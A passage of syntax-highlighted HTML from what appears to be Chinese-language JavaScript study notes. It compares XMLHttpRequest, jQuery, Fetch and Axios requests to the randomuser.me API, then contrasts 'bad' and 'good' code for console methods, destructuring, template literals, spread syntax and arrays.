target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/katsunory/items/9bf9ee49ee5c08bf2b3d\">Javascript の Ajax についての基本まとめ - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://jzchangmark.wordpress.com/2016/06/12/%E9%80%8F%E9%81%8E-curl%E3%80%81python%E3%80%81postman-%E4%BE%86-request-api/\">透過 curl、Python、Postman 來 Request API - 🐴 的學習筆記</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://realdennis.medium.com/%E4%B8%80%E8%B5%B7%E4%BE%86%E6%8A%8A%E7%85%A9%E4%BA%BA-xmlhttprequest-%E8%AE%8A%E6%88%90-fetch-%E6%80%8E%E9%BA%BC%E6%A8%A3-8657f2854894\">一起來把煩人 XMLHttpRequest 變成 Fetch 怎麼樣？</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://eyesofkids.gitbooks.io/javascript-start-from-es6/content/part4/ajax_fetch.html\">AJAX 與 Fetch API · 從 ES6 開始的 JavaScript 學習生活</a></li>\n</ul>\n<h4 id=\"1-xmlhttprequest\">1. XMLHttpRequest</h4>\n<ul>\n<li>js 原生</li>\n<li>難以閱讀與撰寫</li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> result <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".result\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">reqOnload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> data <span class=\"token operator\">=</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>responseText<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">var</span> email <span class=\"token operator\">=</span> data<span class=\"token punctuation\">.</span>results<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>email<span class=\"token punctuation\">;</span>\n  result<span class=\"token punctuation\">.</span>textContent <span class=\"token operator\">=</span> email<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">reqError</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">var</span> request <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XMLHttpRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nrequest<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"get\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"https://randomuser.me/api/\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nrequest<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nrequest<span class=\"token punctuation\">.</span>onload <span class=\"token operator\">=</span> reqOnload<span class=\"token punctuation\">;</span>\nrequest<span class=\"token punctuation\">.</span>onerror <span class=\"token operator\">=</span> reqError<span class=\"token punctuation\">;</span></code></pre><h4 id=\"2-jqeury\">2. jQeury</h4>\n<ul>\n<li>基於 XHR 開發，然而 XHR 架構不清晰，並已有替代方案</li>\n<li>jQuery 整體項目太大，效益低落</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://tw.alphacamp.co/blog/jquery-javascript-library-overview\">什麼是 jQuery？前端框架盛行還需要 JavaScript 函式庫嗎？｜ ALPHA Camp Blog</a></li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> result <span class=\"token operator\">=</span> <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".result\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n$<span class=\"token punctuation\">.</span><span class=\"token function\">ajax</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  url<span class=\"token operator\">:</span> <span class=\"token string\">\"https://randomuser.me/api/\"</span><span class=\"token punctuation\">,</span>\n  dataType<span class=\"token operator\">:</span> <span class=\"token string\">\"json\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token function-variable function\">success</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    result<span class=\"token punctuation\">.</span><span class=\"token function\">html</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>results<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>email<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"3-fetch\">3. Fetch</h4>\n<ul>\n<li>自 ES6 起提供的方式</li>\n<li>概念相近 jQuery 的 <code>$.ajax</code></li>\n<li>使用 ES6 的 Promise 進行回傳，回傳<code>ReadableStream</code>物件</li>\n<li>需搭配 then 與 catch 進行處理</li>\n<li>會將 400，500 都當做請求成功，需要另外做處理</li>\n<li>預設不帶 cookie</li>\n<li>不支援 timeout handle</li>\n<li>不支援監測請求的進度</li>\n<li>較早的瀏覽器並不支援 (IE11 以下不支援)</li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> result <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".result\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"https://randomuser.me/api/\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">response</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> response<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">var</span> email <span class=\"token operator\">=</span> data<span class=\"token punctuation\">.</span>results<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>email<span class=\"token punctuation\">;</span>\n    result<span class=\"token punctuation\">.</span>textContent <span class=\"token operator\">=</span> email<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"4-axios\">4. Axios</h4>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://eugenesu0515.github.io/Blog/2018/06/25/Vue%E5%A5%97%E4%BB%B6%E4%BB%8B%E7%B4%B9%EF%BC%9Aaxios/\">Vue 套件介紹：axios - Eugene Su</a></li>\n<li>Vue.js 作者推薦使用</li>\n<li>使用需引入 <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/axios/axios\">axios</a></li>\n<li>概念相近 jQuery 的 <code>$.ajax</code></li>\n<li>可以在 node.js 中使用</li>\n<li>支援防 CSRF</li>\n<li>提供併發請求</li>\n<li>相當輕量，約 13kb</li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> result <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".result\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\naxios\n  <span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"https://randomuser.me/api/\"</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">response</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> data <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">;</span>\n    result<span class=\"token punctuation\">.</span>textContent <span class=\"token operator\">=</span> data<span class=\"token punctuation\">.</span>results<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>email<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">err</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">finally</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Execued\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"good-javascript-with-modern-feature-vs-bad-code\"><strong>Good Javascript with modern feature</strong> vs <strong>Bad Code</strong></h3>\n<h4 id=\"consolelog\">console.log</h4>\n<h5 id=\"1-table\">1. table</h5>\n<pre class=\"language-js\"><code class=\"language-js\">cosnt foo <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> name<span class=\"token operator\">:</span> <span class=\"token string\">'tom'</span><span class=\"token punctuation\">,</span> age<span class=\"token operator\">:</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> nervous<span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">}</span>\ncosnt bar <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> name<span class=\"token operator\">:</span> <span class=\"token string\">'dick'</span><span class=\"token punctuation\">,</span> age<span class=\"token operator\">:</span> <span class=\"token number\">40</span><span class=\"token punctuation\">,</span> nervous<span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">}</span>\ncosnt baz <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> name<span class=\"token operator\">:</span> <span class=\"token string\">'harry'</span><span class=\"token punctuation\">,</span> age<span class=\"token operator\">:</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span> nervous<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// Bad Code</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>foo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>bar<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>baz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Good Code</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%c My Friends,\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"color: orange; font-weight: bold\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> foo<span class=\"token punctuation\">,</span> bar<span class=\"token punctuation\">,</span> baz <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">table</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>foo<span class=\"token punctuation\">,</span> bar<span class=\"token punctuation\">,</span> baz<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h5 id=\"2-time\">2. time</h5>\n<pre class=\"language-js\"><code class=\"language-js\">console<span class=\"token punctuation\">.</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"looper\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;</span> <span class=\"token number\">1000000</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">timeEnd</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"looper\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h5 id=\"3-trace\">3. trace</h5>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">deleteMe</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> console<span class=\"token punctuation\">.</span><span class=\"token function\">trace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bye bye database\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">deleteMe</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">deleteMe</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"destucturing\">destucturing</h4>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> turtle <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  name<span class=\"token operator\">:</span> <span class=\"token string\">\"Bobo\"</span><span class=\"token punctuation\">,</span>\n  legs<span class=\"token operator\">:</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span>\n  shell<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n  type<span class=\"token operator\">:</span> <span class=\"token string\">\"amphibious\"</span><span class=\"token punctuation\">,</span>\n  meal<span class=\"token operator\">:</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span>\n  diet<span class=\"token operator\">:</span> <span class=\"token string\">\"berries\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Bad Code</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">feed</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">animal</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">return</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Feed </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>animal<span class=\"token punctuation\">.</span>name<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"> </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>animal<span class=\"token punctuation\">.</span>meal<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"> kils of </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>animal<span class=\"token punctuation\">.</span>diet<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// Good Code</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">feed</span><span class=\"token punctuation\">(</span><span class=\"token parameter\"><span class=\"token punctuation\">{</span> name<span class=\"token punctuation\">,</span> meal<span class=\"token punctuation\">,</span> diet <span class=\"token punctuation\">}</span></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">return</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Feed </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>name<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"> </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>meal<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"> kilos of </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>diet<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// OR</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">feed</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">animal</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> name<span class=\"token punctuation\">,</span> meal<span class=\"token punctuation\">,</span> diet <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> animal<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Feed </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>name<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"> </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>meal<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"> kilos of </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>diet<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><h4 id=\"template-literals\">Template literals</h4>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">// Bad Code</span>\n<span class=\"token keyword\">let</span> bio <span class=\"token operator\">=</span>\n  horse<span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span>\n  <span class=\"token string\">\"is a \"</span> <span class=\"token operator\">+</span>\n  horse<span class=\"token punctuation\">.</span>size <span class=\"token operator\">+</span>\n  <span class=\"token string\">\" horse skilled in \"</span> <span class=\"token operator\">+</span>\n  horse<span class=\"token punctuation\">.</span>skills<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" &amp; \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Good Code</span>\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> name<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">,</span> skills <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> horse<span class=\"token punctuation\">;</span>\n\nbio <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>name<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"> is a </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>size<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"> skilled in </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>skills<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" &amp; \"</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span>\n\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>bio<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">horseAge</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">str<span class=\"token punctuation\">,</span> age</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> ageStr <span class=\"token operator\">=</span> age <span class=\"token operator\">></span> <span class=\"token number\">5</span> <span class=\"token operator\">?</span> <span class=\"token string\">\"old\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"young\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>str<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>ageStr<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"> at </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>age<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"> years</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">const</span> bio2 <span class=\"token operator\">=</span> horseAge<span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">This horse is </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>horse<span class=\"token punctuation\">.</span>age<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"spread-syntax\">spread syntax</h4>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> pikachu <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> name<span class=\"token operator\">:</span> <span class=\"token string\">\"Pikachu\"</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> stats <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> hp<span class=\"token operator\">:</span> <span class=\"token number\">40</span><span class=\"token punctuation\">,</span> attack<span class=\"token operator\">:</span> <span class=\"token number\">60</span><span class=\"token punctuation\">,</span> defense<span class=\"token operator\">:</span> <span class=\"token number\">45</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Bad Code</span>\npikachu<span class=\"token punctuation\">[</span><span class=\"token string\">\"hp\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> stats<span class=\"token punctuation\">.</span>hp<span class=\"token punctuation\">;</span>\npikachu<span class=\"token punctuation\">[</span><span class=\"token string\">\"attack\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> stats<span class=\"token punctuation\">.</span>attack<span class=\"token punctuation\">;</span>\npikachu<span class=\"token punctuation\">[</span><span class=\"token string\">\"defense\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> stats<span class=\"token punctuation\">.</span>defense<span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// OR</span>\n<span class=\"token keyword\">const</span> lv10 <span class=\"token operator\">=</span> Object<span class=\"token punctuation\">.</span><span class=\"token function\">assign</span><span class=\"token punctuation\">(</span>pikachu<span class=\"token punctuation\">,</span> stats<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> lv11 <span class=\"token operator\">=</span> Object<span class=\"token punctuation\">.</span><span class=\"token function\">assign</span><span class=\"token punctuation\">(</span>pikachu<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span> hp<span class=\"token operator\">:</span> <span class=\"token number\">45</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Good Code</span>\n<span class=\"token keyword\">const</span> lv10 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span>pikachu<span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span>stats <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> lv11 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span>pikachu<span class=\"token punctuation\">,</span> hp<span class=\"token operator\">:</span> <span class=\"token number\">45</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"array-1\">Array</h4>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> pokemon <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"Arbok\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Raichu\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Sandshrew\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Bad Code</span>\npokemon<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bulbasaur\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\npokemon<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Metapod\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\npokemon<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Weedle\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Good Code</span>\n\n<span class=\"token comment\">// Push</span>\npokemon <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span>pokemon<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Bulbasaur\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Metapod\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Weedle\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Shift</span>\npokemon <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"Bulbasaur\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Metapod\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Weedle\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span>pokemon<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"loops\">loops</h4>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> orders <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">500</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">223</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 